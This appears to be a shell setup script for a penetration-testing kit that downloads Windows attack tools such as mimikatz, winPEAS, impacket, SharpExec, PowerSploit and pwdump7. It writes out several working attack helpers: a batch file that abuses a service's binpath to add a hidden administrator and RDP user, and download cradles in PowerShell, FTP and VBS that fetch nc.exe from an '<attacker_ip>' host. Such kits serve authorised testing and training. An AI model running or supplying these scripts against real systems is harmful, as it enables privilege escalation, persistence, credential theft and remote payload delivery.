mkdir -p public/tools_windows
cd public/tools_windows
    banner "shared_windows - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"
    wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASbat/winPEAS.bat
    wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
    mv winPEAS.exe winPEAS-64.exe
    wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe
    mv winPEAS.exe winPEAS-86.exe

    banner "shared_windows - copy mimikatz"
    cp ../../tools/windows/mimikatz/Win32/mimikatz.exe mimikatz.exe 
    cp ../../tools/windows/mimikatz/Win32/mimilove.exe mimilove.exe 
    cp ../../tools/windows/mimikatz/x64/mimikatz.exe mimikatz64.exe 

    git clone https://github.com/rasta-mouse/Watson
    git clone https://github.com/cobbr/SharpSploit
    git clone https://github.com/anthemtotheego/SharpSploitConsole
    git clone https://github.com/anthemtotheego/SharpExec.git
    git clone https://github.com/anthemtotheego/SharpCradle.git
    git clone https://github.com/Kevin-Robertson/InveighZero

    # TODO BUILD Watson
    #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net35.exe
    #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net45.exe

    # TODO BUILD
    # https://github.com/cobbr/SharpSploit + https://github.com/anthemtotheego/SharpSploitConsole
    
    # SharpExec is an offensive security C# tool designed to aid with lateral movement.
    # -WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket's wmiexec.py tool.
    # -SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket's smbexec.py tool.
    # -PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.
    # -WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.
    # https://github.com/anthemtotheego/SharpExec.git
    wget -N https://github.com/anthemtotheego/SharpExec/raw/master/CompiledBinaries/SharpExec_x64.exe
    wget -N https://github.com/anthemtotheego/SharpExec/raw/master/CompiledBinaries/SharpExec_x86.exe

    # SharpCradle is a tool designed to help penetration testers or red teams download and execute .NET binaries into memory.
    # https://github.com/anthemtotheego/SharpCradle.git
    wget -N https://github.com/anthemtotheego/SharpCradle/raw/master/CompiledBinaries/SharpCradle_x64.exe
    wget -N https://github.com/anthemtotheego/SharpCradle/raw/master/CompiledBinaries/SharpCradle_x86.exe

    # TODO build - similar to responder
    # https://github.com/Kevin-Robertson/InveighZero

    # TODO - PyINstaller on examples
    banner "shared_windows - https://github.com/SecureAuthCorp/impacket.git"
    git clone --depth=1 --recursive https://github.com/SecureAuthCorp/impacket.git

    banner "shared_windows - https://github.com/Kevin-Robertson/Invoke-TheHash.git"
    git clone --depth=1 --recursive https://github.com/Kevin-Robertson/Invoke-TheHash.git

    banner "shared_windows - accesschk-2003-xp - https://github.com/ankh2054/windows-pentest/tree/master/Privelege"
    wget -N https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe

    banner "shared_windows - accesschk-2008-vista.exe - https://github.com/ankh2054/windows-pentest/tree/master/Privelege"
    wget -N https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2008-vista.exe

    if [ ! -f accesschk.exe ]; then
        banner "shared_windows - accesschk.exe - https://download.sysinternals.com/files/AccessChk.zip"
        wget https://download.sysinternals.com/files/AccessChk.zip
        unzip AccessChk.zip
        rm Eula.txt
        rm AccessChk.zip
    fi

    if [ ! -d pstools ]; then
        banner "shared_windows - PSTools - https://download.sysinternals.com/files/PSTools.zip"
        wget https://download.sysinternals.com/files/PSTools.zip
        unzip PSTools.zip -d pstools
        rm PSTools.zip
    fi

    if [ ! -f wce.exe ]; then
        banner "shared_windows - wce - https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip"
        wget https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
        unzip wce_v1_41beta_universal.zip -d wce
        cp wce/wce.exe .
        rm -rf wce
        rm wce_v1_41beta_universal.zip
    fi

    if [ ! -f tcpdump.exe ]; then
        banner "shared_windows - tcpdump - http://www.microolap.com/downloads/tcpdump/tcpdump_trial_license.zip"
        wget http://www.microolap.com/downloads/tcpdump/tcpdump_trial_license.zip
        unzip tcpdump_trial_license.zip -d tcpdumpwim
        cp tcpdumpwim/tcpdump.exe .
        rm -rf tcpdumpwim
        rm tcpdump_trial_license.zip
    fi

    if [ ! -f gp3finder.exe ]; then
        banner "shared_windows - gp3finder_v4.0 - http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip"
        wget http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip
        unzip gp3finder_v4.0.zip
        rm gp3finder_v4.0.zip
    fi

    #TODO Installation
    banner "shared_windows - WiresharkPortable_3.2.0 - https://2.na.dl.wireshark.org/win32/WiresharkPortable_3.2.0.paf.exe"
    wget -N https://2.na.dl.wireshark.org/win32/WiresharkPortable_3.2.0.paf.exe

    if [ ! -d 3proxy ]; then
        banner "shared_windows - https://github.com/z3APA3A/3proxy"
        wget https://github.com/z3APA3A/3proxy/releases/download/0.8.13/3proxy-0.8.13.zip
        unzip 3proxy-0.8.13.zip -d 3proxy
        mv 3proxy-0.8.13.zip 3proxy.zip
    fi

    if [ ! -d pwdump7 ]; then
        banner "shared_windows - http://www.tarasco.org/security/pwdump_7/pwdump7.zip"
        wget http://www.tarasco.org/security/pwdump_7/pwdump7.zip
        unzip pwdump7.zip -d pwdump7
        rm pwdump7.zip
    fi

    banner "shared_windows - https://github.com/pentestmonkey/windows-privesc-check"
    wget -N https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe

    if [ ! -d sysi ]; then
        banner "shared_windows - https://download.sysinternals.com/files/SysinternalsSuite.zip"
        wget https://download.sysinternals.com/files/SysinternalsSuite.zip
        unzip SysinternalsSuite.zip -d sysi
        rm SysinternalsSuite.zip
    fi

    banner "shared_windows - https://github.com/rasta-mouse/Sherlock.git"
    wget -N https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

    # Compile
    # banner "shared_windows - https://github.com/GhostPack/Seatbelt"
    # git clone --depth=1 --recursive https://github.com/GhostPack/Seatbelt

    banner "shared_windows - https://github.com/PowerShellMafia/PowerSploit.git"
    git clone --depth=1 --recursive https://github.com/PowerShellMafia/PowerSploit.git

    banner "shared_windows - https://github.com/samratashok/nishang.git"
    git clone --depth=1 --recursive https://github.com/samratashok/nishang.git

    banner "shared_windows - https://github.com/411Hall/JAWS.git"
    git clone --depth=1 --recursive https://github.com/411Hall/JAWS.git

    banner "shared_windows - https://github.com/Arvanaghi/SessionGopher.git"
    git clone --depth=1 --recursive https://github.com/Arvanaghi/SessionGopher.git

    banner "shared_windows - https://github.com/enjoiz/Privesc.git"
    git clone --depth=1 --recursive https://github.com/enjoiz/Privesc.git

    banner "shared_windows - https://github.com/AlessandroZ/BeRoot.git"
    git clone --depth=1 --recursive https://github.com/AlessandroZ/BeRoot.git

    banner "shared_windows - https://github.com/Kevin-Robertson/Powermad.git"
    git clone --depth=1 --recursive https://github.com/Kevin-Robertson/Powermad.git

    banner "shared_windows - https://github.com/Ben0xA/nps"
    wget -N https://github.com/Ben0xA/nps/raw/master/binary/nps.zip
    unzip nps.zip
    rm nps.zip

    banner "shared_windows - impacket_static_binaries - https://github.com/ropnop/impacket_static_binaries"
    if [ ! -d impacketbins ]; then
        mkdir impacketbins
        cd impacketbins
            path=`curl https://github.com/ropnop/impacket_static_binaries/releases | grep "/ropnop/impacket_static_binaries/releases/download/" | cut -d "\"" -f2 | grep "impacket_windows" | head -1`
            wget -nc "https://github.com/$path"
            unzip impacket_windows_binaries.zip
        cd ..
    fi

    banner "shared_windows - EyeWitness is designed to take screenshots of websites - https://www.christophertruncer.com/InstallMe/EyeWitness.zip"
    if [ ! -f EyeWitness.exe ]; then
        wget https://www.christophertruncer.com/InstallMe/EyeWitness.zip
        unzip EyeWitness -d EyeWitness
        mv EyeWitness/EyeWitness.exe .
        rm -rf EyeWitness
    fi

    banner "shared_windows - nmap-win32 - https://nmap.org/dist/nmap-7.80-win32.zip"
    if [ ! -f nmap.zip ]; then
        wget -N https://nmap.org/dist/nmap-7.80-win32.zip
        mv nmap-7.80-win32.zip nmap.zip
    fi

banner "shared_windows - service_abuse_create_user.bat"
cat <<\EOT >service_abuse_create_user.bat
    sc config WebDriveService binpath= "net user /add amxuser1 amxpass1234"
    sc config WebDriveService obj= ".\LocalSystem" password= ""
    sc qc WebDriveService
    net stop WebDriveService
    net start WebDriveService
    net start WebDriveService

    sc config WebDriveService binpath= "net localgroup administrators amxuser1 /add"
    sc config WebDriveService obj= ".\LocalSystem" password= ""
    sc qc WebDriveService
    net stop WebDriveService
    net start WebDriveService
    net start WebDriveService

    sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
    sc config WebDriveService obj= ".\LocalSystem" password= ""
    sc qc WebDriveService
    net stop WebDriveService
    net start WebDriveService
    net start WebDriveService
EOT

banner "shared_windows - wget.ps1.bat"
cat <<\EOT >wget.ps1.bat
    echo $storageDir = $pwd > wget.ps1
    echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
    echo $url = "http://<URL>" >>wget.ps1 
    echo $file = "example.exe" >>wget.ps1
    echo $webclient.DownloadFile($url,$file) >>wget.ps1
EOT

banner "shared_windows - wget.ftp.bat"
cat <<\EOT >ftp_download_file.bat
    echo open <attacker_ip> 21> ftp.txt
    echo USER offsec>> ftp.txt
    echo ftp>> ftp.txt
    echo bin >> ftp.txt
    echo GET nc.exe >> ftp.txt
    echo bye >> ftp.txt

    ftp -v -n -s:ftp.txt
EOT

banner "shared_windows - wget.vbs.bat"
cat <<\EOT >wget.vbs.bat
    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
    echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
    echo Err.Clear >> wget.vbs
    echo Set http = Nothing >> wget.vbs
    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
    echo http.Open "GET",strURL,False >> wget.vbs
    echo http.Send >> wget.vbs
    echo varByteArray = http.ResponseBody >> wget.vbs
    echo Set http = Nothing >> wget.vbs
    echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
    echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
    echo strData = "" >> wget.vbs
    echo strBuffer = "" >> wget.vbs
    echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
    echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
    echo Next >> wget.vbs
    echo ts.Close >> wget.vbs

    # cscript wget.vbs http://<attacker_ip>/nc.exe nc.exe
EOT
cd ../..

rm -rf public/tools_windows/bin
mkdir -p public/tools_windows/bin
cd public/tools_windows/bin

    banner "shared_windows - copying /usr/share/windows-binaries/* to bin"
    cp -rf /usr/share/windows-binaries/* .

    banner "shared_windows - downloading binaries from saule-spb.ru"
    # http://www.saule-spb.ru/touch/windows_files.html
    wget http://www.saule-spb.ru/windows/reg.zip
    wget http://www.saule-spb.ru/windows/regedit.zip
    wget http://www.saule-spb.ru/windows/regini.zip
    wget http://www.saule-spb.ru/windows/sclist.zip
    unzip sclist.zip
    mv sclist/sclist.exe sclist.exe
    rm -rf sclist
    rm sclist.zip
    
    wget http://www.saule-spb.ru/windows/tasklist.zip
    wget http://www.saule-spb.ru/windows/taskkill.rar
    wget http://www.saule-spb.ru/windows/netstat.zip
    wget http://www.saule-spb.ru/windows/ip6fw.zip
    
    wget http://www.saule-spb.ru/windows/tcpip-2892.zip
    unzip tcpip-2892.zip
    mv tcpip.sys tcpip-2892.sys
    rm tcpip-2892.zip
    
    wget http://www.saule-spb.ru/windows/tcpip-2180.zip
    unzip tcpip-2180.zip
    mv tcpip.sys tcpip-2180.sys
    rm tcpip-2180.zip
    
    wget http://www.saule-spb.ru/windows/sfc_os_dll_5.1.2600.1106.rar
    wget http://www.saule-spb.ru/windows/sfc_os_dll_5.1.2600.2180.rar
    wget http://www.saule-spb.ru/windows/sfc_os_dll_5.2.3790.3959.rar
    
    # Run a DLL as an App
    wget http://www.saule-spb.ru/windows/rundll32_xp2.zip
    unzip rundll32_xp2.zip
    mv rundll32_xp2/rundll32.exe rundll32_xp2.exe
    rm -rf rundll32_xp2
    rm rundll32_xp2.zip
    
    wget http://www.saule-spb.ru/windows/rundll32_2003.zip
    unzip rundll32_2003.zip
    mv rundll32.exe rundll32_2003.exe
    rm rundll32_2003.zip
    
    # Windows Control Panel
    wget http://www.saule-spb.ru/windows/control_2003.zip
    
    # System Configuration Utility
    wget http://www.saule-spb.ru/windows/msconfig_xp2.zip
    unzip msconfig_xp2.zip
    mv msconfig.exe msconfig_xp2.exe
    rm msconfig_xp2.zip

    wget http://www.saule-spb.ru/windows/msconfig_2003.zip
    unzip msconfig_2003.zip
    mv msconfig.exe msconfig_2003.exe
    rm msconfig_2003.zip
    
    for i in *.zip; do unzip $i; done
    for i in *.rar; do unrar x $i; done
    rm *.zip *.rar

cd ../../..
